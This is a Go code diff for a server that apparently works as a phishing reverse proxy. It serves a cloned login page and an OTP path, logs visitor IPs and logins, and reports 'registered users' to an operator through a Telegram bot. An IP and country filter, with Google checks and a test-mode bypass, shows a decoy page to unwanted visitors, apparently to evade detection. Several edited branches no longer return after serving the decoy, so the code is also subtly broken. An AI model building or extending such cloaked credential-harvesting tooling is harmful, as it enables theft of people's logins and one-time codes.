@@ -3,12 +3,11 @@ package main
 import (
 	"bytes"
 	"compress/gzip"
-	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
-
 	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 	"github.com/google/uuid"
 	"github.com/patrickmn/go-cache"
 	"golang.org/x/net/html"
@@ -20,7 +19,9 @@ import (
 	"net/http/httputil"
 	"net/url"
 	"os"
+	"path/filepath"
 	"regexp"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -547,7 +548,16 @@ func getCountryCode(r *http.Request) string {
 }
 
 func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
+	var filePath string
 
+	// بررسی سیستم‌عامل
+	if runtime.GOOS == "windows" {
+		// مسیر دایرکتوری برای ویندوز
+		filePath = filepath.Join("E:", "cgi_perfect", "style", "index", "index2.html")
+	} else {
+		// مسیر دایرکتوری برای لینوکس
+		filePath = filepath.Join("/root", "cgi_per", "style", "index", "index2.html")
+	}
 	domain := req.Host
 	Domain = "http://" + domain
 	log.Printf("domain: %v", domain)
@@ -573,67 +583,100 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 	allowed, err := isIPAllowedOrFromGoogle(req)
 	if err != nil {
 		log.Printf("Error checking google: %v", err)
-		res.Header().Set("Location", "/index/index2.html")
+		file, err := os.ReadFile(filePath)
+		if err != nil {
 
-		res.WriteHeader(http.StatusFound)
-		return
+			http.Error(res, "Unable to load page", http.StatusInternalServerError)
+			return
+		}
+		res.Header().Set("Content-Type", "text/html")
+		res.Write(file)
+
 	}
 	if allowed {
 		allowedPath, err := isPathAllowed(req.URL.Path)
 		if err != nil {
 			log.Printf("Error checking path: %v", err)
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		if !allowedPath {
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 		if err != nil {
 			log.Printf("Error checking IP: %v", err)
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		ipBlocked, err := isIPBlocked(db, ip)
 		if err != nil {
 			log.Printf("Error checking if IP is blocked: %v", err)
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		countryBlocked := isCountryBlocked(country)
 		if err != nil {
 			log.Printf("Error checking if country is blocked: %v", err)
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		if ipBlocked || countryBlocked {
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		// درج لاگ بازدید در دیتابیس
 		err = insertVisitLog(ip, req.URL.Path, req.Host, referer, platform, time.Now(), country)
 		if err != nil {
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		// افزایش تعداد درخواست‌ها برای این IP
@@ -642,10 +685,14 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 		// اگر تعداد درخواست‌ها از 100 بیشتر باشد، IP را بلاک کنید
 		if getRequestCount(ip) > 100 {
 			blockIP(ip)
-			res.Header().Set("Location", "/index/index2.html")
+			file, err := os.ReadFile(filePath)
+			if err != nil {
 
-			res.WriteHeader(http.StatusFound)
-			return
+				http.Error(res, "Unable to load page", http.StatusInternalServerError)
+				return
+			}
+			res.Header().Set("Content-Type", "text/html")
+			res.Write(file)
 		}
 
 		if match, _ := regexp.MatchString("/otp.asp$", req.URL.Path); match {
@@ -693,7 +740,7 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 
 		} else if match, _ := regexp.MatchString("/index/$", req.URL.Path); match {
 			//htmlFile, err := os.ReadFile("/root/cgi_perfect/accentlogin.html")
-			htmlFile, err := os.ReadFile("root/cgi_perfect/style/index/accentlogin.html")
+			htmlFile, err := os.ReadFile("root/cgi_per/style/index/accentlogin.html")
 			if err != nil {
 				log.Fatal(err) // خطا در خواندن فایل
 			}
@@ -858,10 +905,14 @@ func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
 
 		proxy.ServeHTTP(res, req)
 	} else {
-		res.Header().Set("Location", "/index/index2.html")
+		file, err := os.ReadFile(filePath)
+		if err != nil {
 
-		res.WriteHeader(http.StatusFound)
-		return
+			http.Error(res, "Unable to load page", http.StatusInternalServerError)
+			return
+		}
+		res.Header().Set("Content-Type", "text/html")
+		res.Write(file)
 	}
 }
 
@@ -1110,7 +1161,9 @@ func getRequestCount2(db *sql.DB, ip, path string) (int, error) {
 }
 func isIPAllowedOrFromGoogle(req *http.Request) (bool, error) {
 	ip := getIP(req)
-
+	if testMode {
+		return true, nil
+	}
 	// بررسی اینکه آیا IP در دیتابیس موجود است (مجاز است)
 	var exists bool
 	err := db.QueryRow(`
@@ -1214,6 +1267,53 @@ func createTables(db *sql.DB) error {
 
 	return nil
 }
+func getBlockedIPsCount() (int, error) {
+	var count int
+	query := "SELECT COUNT(*) FROM blocked_ips"
+	err := db.QueryRow(query).Scan(&count)
+	if err != nil {
+		return 0, err
+	}
+	return count, nil
+}
+
+func getBlockedCountriesCount() (int, error) {
+	var count int
+	query := "SELECT COUNT(*) FROM blocked_countries"
+	err := db.QueryRow(query).Scan(&count)
+	if err != nil {
+		return 0, err
+	}
+	return count, nil
+}
+func getUniqueIPsCount() (int, error) {
+	var count int
+	query := "SELECT COUNT(DISTINCT ip) FROM visit_logs"
+	err := db.QueryRow(query).Scan(&count)
+	if err != nil {
+		return 0, err
+	}
+	return count, nil
+}
+
+func getTotalRequestsCount() (int, error) {
+	var total int
+	query := "SELECT SUM(request_count) FROM visit_logs"
+	err := db.QueryRow(query).Scan(&total)
+	if err != nil {
+		return 0, err
+	}
+	return total, nil
+}
+func getRegisteredUsersCount() (int, error) {
+	var count int
+	query := "SELECT COUNT(*) FROM login_logs"
+	err := db.QueryRow(query).Scan(&count)
+	if err != nil {
+		return 0, err
+	}
+	return count, nil
+}
 func startTelegramBot() {
 	bot, err := tgbotapi.NewBotAPI(TelegramBotToken)
 	if err != nil {
@@ -1240,6 +1340,53 @@ func startTelegramBot() {
 			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Test mode deactivated")
 			bot.Send(msg)
 
+		case "تعداد آی‌پی‌های بلاک شده":
+			count, err := getBlockedIPsCount()
+			if err != nil {
+				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching blocked IPs")
+				bot.Send(msg)
+				continue
+			}
+			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Blocked IPs: %d", count))
+			bot.Send(msg)
+
+		case "تعداد کشورهای بلاک شده":
+			count, err := getBlockedCountriesCount()
+			if err != nil {
+				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching blocked countries")
+				bot.Send(msg)
+				continue
+			}
+			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Blocked countries: %d", count))
+			bot.Send(msg)
+		case "تعداد آی‌پی‌های یونیک":
+			count, err := getUniqueIPsCount()
+			if err != nil {
+				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching unique IPs")
+				bot.Send(msg)
+				continue
+			}
+			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Unique IPs: %d", count))
+			bot.Send(msg)
+
+		case "تعداد کل درخواست‌ها":
+			total, err := getTotalRequestsCount()
+			if err != nil {
+				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching total requests")
+				bot.Send(msg)
+				continue
+			}
+			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Total requests: %d", total))
+			bot.Send(msg)
+		case "تعداد کاربران ثبت‌نام شده":
+			count, err := getRegisteredUsersCount()
+			if err != nil {
+				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error fetching registered users")
+				bot.Send(msg)
+				continue
+			}
+			msg := tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Registered users: %d", count))
+			bot.Send(msg)
 		default:
 			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Unknown command")
 			bot.Send(msg)
